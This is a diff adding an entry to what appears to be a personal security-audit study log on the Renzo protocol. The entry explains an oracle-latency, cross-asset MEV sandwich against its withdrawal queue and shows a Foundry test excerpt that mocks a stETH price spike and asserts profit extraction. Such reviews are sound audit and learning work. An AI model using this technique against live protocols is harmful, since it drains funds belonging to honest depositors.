@@ -86,3 +86,37 @@ Below is the core exploit execution demonstrating the ReentrancyGuard brick:
 ## 3. Assimilated Discoveries (Reverse-Engineered Findings)
 *This section contains critical/medium vulnerabilities from the official report that I initially missed or left for the assimilation phase. I will reverse-engineer the root causes and write my own original Foundry PoCs to demonstrate the exploits.*
 
+### [H-04] Oracle Latency / MEV Sandwich via WithdrawQueue enables risk-free profit extraction
+
+**Description & Business Impact:**
+The protocol calculates the value of `ezETH` based on the combined value of all supported assets (TVL) via Chainlink oracles. During a withdrawal claim in `WithdrawQueue.sol`, the protocol locks in the withdrawal amount based on the current Oracle prices. Because oracles update asynchronously, a malicious actor can monitor the mempool for an impending oracle price spike for a volatile asset (e.g., stETH), or wait for natural latency. By depositing right before the spike, waiting for the update, and immediately withdrawing their `ezETH` in a different, non-spiked asset (like Native ETH), the attacker performs a cross-asset MEV sandwich.
+This allows the attacker to extract significantly more Native ETH than they deposited, draining the protocol's backing value at the direct expense of honest depositors.
+
+**Retrospective / Missed Vector:**
+I noticed the design: withdrawal amounts are priced at request time, not at claim time. I flagged it as unusual. I know what a MEV sandwich is and how it works. My brain failed to connect the two in that moment. In retrospect, the link is obvious — lock a valuation in the past, exploit the price delta at settlement. I had both pieces. I didn't assemble them.
+
+**Proof of Concept (Foundry):**
+The complete executable PoC can be found in [`PoCs/03_Renzo_H04_PoC.t.sol`](./PoCs/03_Renzo_H04_PoC.t.sol).
+Below is the core exploit execution demonstrating the profit extraction:
+
+```solidity
+        // 2. Act: stETH oracle price spikes by 50% (1 stETH = 1.5 ETH)
+        // This artificially inflates the TVL and thus the value of ezETH
+        MockAggrV3(stEthOracle).setAnswer(1.5 ether);
+
+        // 3. Act: Alice withdraws her 10 stETH worth of ezETH, but takes Native ETH
+        // Since Native ETH price hasn't spiked, she can extract more Native ETH
+        vm.startPrank(alice);
+        withdrawQueue.claim(0);
+        vm.stopPrank();
+
+        uint256 finalBalance = alice.balance;
+        uint256 profit = finalBalance - 10 ether;
+        
+        console.log("Alice Initial Deposit (ETH) : 10.0000");
+        console.log("Alice Final Balance (ETH)   : %s.%s", finalBalance / 1 ether, (finalBalance % 1 ether) / 1e14);
+        console.log("Extracted Profit (ETH)      : %s.%s", profit / 1 ether, (profit % 1 ether) / 1e14);
+
+        // 4. Assert: Alice deposited 10 stETH (worth 10 ETH) but successfully extracted >12 ETH.
+        assertGt(finalBalance, 12 ether, "Alice extracted value from the protocol");
+```
